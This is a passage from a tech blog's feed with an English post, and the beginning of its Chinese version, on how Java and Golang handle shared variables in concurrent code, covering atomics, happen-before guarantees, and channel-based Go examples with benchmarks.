safe!&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;err&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;        t1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&quot;golang&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#golang&quot;&gt;#&lt;/a&gt; Golang&lt;/h1&gt;
&lt;h2 id=&quot;how-golang-solve-atomicity&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#how-golang-solve-atomicity&quot;&gt;#&lt;/a&gt; How Golang solve Atomicity&lt;/h2&gt;
&lt;p&gt;Golang provides its atomicity tool kit, too.&lt;/p&gt;
&lt;p&gt;Do you remember the Golang’s Lock example at the beginning of the article? We can use atomic instead of Lock:&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;BenchmarkFib10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;testing&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;B&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; n &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; n &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; b&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;N&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; n&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		a &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;int64&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			atomic&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;AddInt64&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If you run benchmark, you would figure out the performance gap between Lock and atomicity:&lt;/p&gt;
&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;BenchmarkLock-8 &lt;span class=&quot;token number&quot;&gt;9266&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;134075&lt;/span&gt; ns/op &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt; B/op &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; allocs/op  &lt;br&gt;BenchmarkAtomic-8 &lt;span class=&quot;token number&quot;&gt;19225&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;62309&lt;/span&gt; ns/op &lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt; B/op &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; allocs/op&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And below is the profiling of atomicity:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/atomic-profiling.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;how-golang-solve-happen-before%3F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#how-golang-solve-happen-before%3F&quot;&gt;#&lt;/a&gt; How Golang solve happen-before?&lt;/h2&gt;
&lt;p&gt;According to Golang’s official blog, Golang would guarantee happen-before in these conditions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Initialization&lt;/li&gt;
&lt;li&gt;Goroutine creation&lt;/li&gt;
&lt;li&gt;Goroutine destruction&lt;/li&gt;
&lt;li&gt;Channel communication&lt;/li&gt;
&lt;li&gt;Locks&lt;/li&gt;
&lt;li&gt;Once&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;But Golang does not provide something like volatile in Java to protect one variable share between goroutines. In terms of visibility, Such as below code may be incorrect synchronization:&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;&lt;br&gt;	flag &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; flag &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;		fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Never end\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	flag &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;line 5~10 would never end.&lt;/p&gt;
&lt;p&gt;Then ordering. &lt;a href=&quot;https://medium.com/r/?url=https%3A%2F%2Fgolang.org%2Fref%2Fmem&quot;&gt;The Official Goalng Blog&lt;/a&gt; mentions that this code is non-concurrence safe:&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; b &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;br&gt;	b &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token function&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token function&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token function&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It may happen that g prints 2 and then 1. So we must protect that variable with something like Lock to protect it. But how come an effective Language like Golang would handle this issue in such a heavy way?&lt;/p&gt;
&lt;p&gt;Look at this Golang’s official blog, we can see how to solve the issue in Golang way. The blog mentions that:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Do not communicate by sharing memory; instead, share memory by communicating.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;That’s the way Golang encourages you to do: using &lt;a href=&quot;https://en.wikipedia.org/wiki/Communicating_sequential_processes&quot;&gt;CSP model&lt;/a&gt;. So I think the key way to solve the shared variable in concurrency in Golang is “NOT TO SHARE IT”. Instead, you should use chan to communicate. And as mentioned above, chan DO guarantee happen-before!&lt;/p&gt;
&lt;p&gt;According to discuss above, I think it should pass flag through chan in the visibility example:&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;&lt;br&gt;	done &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;done &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		flag &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; flag &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token keyword&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; flag &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;done&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;br&gt;				&lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;		fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;End of goroutine\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;done&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	done &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;done&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;continue&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Also, I think it should pass a and b through chan in the ordering example, the code may look like:&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; b &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;done &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	chana &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	chanb &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;chana&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;chanb&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;		chana &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;br&gt;		chanb &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token keyword&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;done&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;br&gt;				&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;br&gt;			&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; chana&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; chanb&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token function&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token function&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	done &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;done&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	chana&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; chanb &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;done&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	a &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;chana&lt;br&gt;	b &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;chanb&lt;br&gt;	&lt;span class=&quot;token function&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;conclusion&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#conclusion&quot;&gt;#&lt;/a&gt; Conclusion&lt;/h3&gt;
&lt;p&gt;The most difficult part of writing concurrency code is that most of the bug is not determined, uncertain, and can not reproduce easily, thus it’s had to debug.&lt;/p&gt;
&lt;p&gt;That’s why we should dig deeper into detail in how a program langue handle concurrency, understand how your code would run in your machine and prevent you from doing thing wrong.&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>比較 Java 和 Golang 在撰寫併發時處理共享變數的差異</title>
		<link href="https://tech-blog.cymetrics.io/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-zh/"/>
		<updated>2021-05-03T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable-zh/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;p&gt;在寫 concurrency 程式時，通常會用 lock、synchronized 等機制保護存取共享資源的程式片段，確保一次只有一個 thread 可以使用這些共享資源。&lt;/p&gt;
&lt;p&gt;但若是共享資源不是一個程式片段而僅僅只是一個變數，使用 lock、synchronized 等機制就會顯得太笨重，甚至拖慢效能。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;以下面的 Golang 程式來說：&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;BenchmarkLocke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;b &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;testing&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;B&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; n &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; n &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; b&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;N&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; n&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		a &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; l sync&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Mutex&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i 